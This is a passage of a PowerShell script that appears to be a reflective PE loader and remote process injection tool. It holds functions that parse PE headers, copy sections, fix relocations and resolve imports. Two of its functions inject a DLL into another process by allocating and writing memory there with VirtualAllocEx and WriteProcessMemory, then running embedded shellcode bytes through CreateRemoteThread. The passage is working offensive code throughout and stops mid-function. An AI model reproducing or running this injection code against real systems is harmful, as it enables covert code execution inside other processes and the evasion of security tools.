        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
        
        #Build the PEInfo object
        $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
        $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
        $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
        $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        
        if ($PEInfo.PE64Bit -eq $true)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        else
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        
        if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
        }
        elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
        }
        else
        {
            Throw "PE file is not an EXE or DLL"
        }
        
        return $PEInfo
    }
    
    
    Function Import-DllInRemoteProcess
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $ImportDllPathPtr
        )
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
        $DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
        $RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($RImportDllPathPtr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }

        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
        
        if ($Success -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($DllPathSize -ne $NumBytesWritten)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }
        
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
        
        [IntPtr]$DllAddress = [IntPtr]::Zero
        #For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
        #   Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
        if ($PEInfo.PE64Bit -eq $true)
        {
            #Allocate memory for the address returned by LoadLibraryA
            $LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
            }
            
            
            #Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
            $LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $LoadLibrarySC2 = @(0x48, 0xba)
            $LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
            $LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
            
            $SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
            $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
            $SCPSMemOriginal = $SCPSMem
            
            Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
            Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
            $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

            
            $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($RSCAddr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for shellcode"
            }
            
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
            if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
            {
                Throw "Unable to write shellcode to remote process memory."
            }
            
            $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }
            
            #The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
            [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
            $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
            if ($Result -eq $false)
            {
                Throw "Call to ReadProcessMemory failed"
            }
            [IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        else
        {
            [IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
            $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
            if ($Result -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }
            
            [Int32]$ExitCode = 0
            $Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
            if (($Result -eq 0) -or ($ExitCode -eq 0))
            {
                Throw "Call to GetExitCodeThread failed"
            }
            
            [IntPtr]$DllAddress = [IntPtr]$ExitCode
        }
        
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        
        return $DllAddress
    }
    
    
    Function Get-RemoteProcAddress
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $RemoteDllHandle,
        
        [Parameter(Position=2, Mandatory=$true)]
        [IntPtr]
        $FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        [IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        #If not loading by ordinal, write the function name to the remote process memory
        if (-not $LoadByOrdinal)
        {
            $FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

            #Write FunctionName to memory (will be used in GetProcAddress)
            $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
            $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($RFuncNamePtr -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process"
            }

            [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
            $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
            if ($Success -eq $false)
            {
                Throw "Unable to write DLL path to remote process memory"
            }
            if ($FunctionNameSize -ne $NumBytesWritten)
            {
                Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
            }
        }
        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }
        
        #Get address of GetProcAddress
        $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
        $GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

        
        #Allocate memory for the address returned by GetProcAddress
        $GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
        }
        
        
        #Write Shellcode to the remote process which will call GetProcAddress
        #Shellcode: GetProcAddress.asm
        [Byte[]]$GetProcAddressSC = @()
        if ($PEInfo.PE64Bit -eq $true)
        {
            $GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $GetProcAddressSC2 = @(0x48, 0xba)
            $GetProcAddressSC3 = @(0x48, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
            $GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
        }
        else
        {
            $GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
            $GetProcAddressSC2 = @(0xb9)
            $GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
            $GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
            $GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
        }
        $SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
        $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
        $SCPSMemOriginal = $SCPSMem
        
        Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
        
        $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        if ($RSCAddr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for shellcode"
        }
        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
        if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
        {
            Throw "Unable to write shellcode to remote process memory."
        }
        
        $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
        $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
        if ($Result -ne 0)
        {
            Throw "Call to CreateRemoteThread to call GetProcAddress failed."
        }
        
        #The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
        [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
        $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
        if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
        {
            Throw "Call to ReadProcessMemory failed"
        }
        [IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        #Cleanup remote process memory
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        
        return $ProcAddress
    }


    Function Copy-Sections
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
        
            #Address to copy the section to
            [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
            
            #SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
            #    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
            #    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
            #    so truncate SizeOfRawData to VirtualSize
            $SizeOfRawData = $SectionHeader.SizeOfRawData

            if ($SectionHeader.PointerToRawData -eq 0)
            {
                $SizeOfRawData = 0
            }
            
            if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
            {
                $SizeOfRawData = $SectionHeader.VirtualSize
            }
            
            if ($SizeOfRawData -gt 0)
            {
                Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
                [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
            }
        
            #If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
            if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
            {
                $Difference = $SectionHeader.VirtualSize - $SizeOfRawData
                [IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
                Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
                $Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
            }
        }
    }


    Function Update-MemoryAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $OriginalImageBase,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        [Int64]$BaseDifference = 0
        $AddDifference = $true #Track if the difference variable should be added or subtracted from variables
        [UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
        
        #If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
        if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
                -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
        {
            return
        }


        elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
            $AddDifference = $false
        }
        elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
        }
        
        #Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
        [IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
        while($true)
        {
            #If SizeOfBlock == 0, we are done
            $BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

            if ($BaseRelocationTable.SizeOfBlock -eq 0)
            {
                break
            }

            [IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
            $NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

            #Loop through each relocation
            for($i = 0; $i -lt $NumRelocations; $i++)
            {
                #Get info for this relocation
                $RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
                [UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

                #First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
                [UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
                [UInt16]$RelocType = $RelocationInfo -band 0xF000
                for ($j = 0; $j -lt 12; $j++)
                {
                    $RelocType = [Math]::Floor($RelocType / 2)
                }

                #For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
                #This appears to be true for EXE's as well.
                #   Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
                if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
                        -or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
                {           
                    #Get the current memory address and update it based off the difference between PE expected base address and actual base address
                    [IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
                    [IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
        
                    if ($AddDifference -eq $true)
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }
                    else
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }               

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
                }
                elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
                {
                    #IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
                    Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
                }
            }
            
            $BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
        }
    }


    Function Import-DllImports
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 4, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle
        )
        
        $RemoteLoading = $false
        if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
        {
            $RemoteLoading = $true
        }
        
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done importing DLL imports"
                    break
                }

                $ImportDllHandle = [IntPtr]::Zero
                $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
                
                if ($RemoteLoading -eq $true)
                {
                    $ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
                }
                else
                {
                    $ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
                }

                if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
                {
                    throw "Error importing DLL, DLLName: $ImportDllPath"
                }
                
                #Get the first thunk, then loop through all of them
                [IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
                [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
                [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
                
                while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
                {
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
                    #Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
                    #   If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
                    #   and doing the comparison, just see if it is less than 0
                    [IntPtr]$NewThunkRef = [IntPtr]::Zero
                    if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
                    }
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
                    }
                    else
                    {
                        [IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
                        $StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                        $ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
                    }
                    
                    if ($RemoteLoading -eq $true)
                    {
                        [IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
                    }
                    else
                    {
                        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
                    }
                    
                    if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
                    {
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
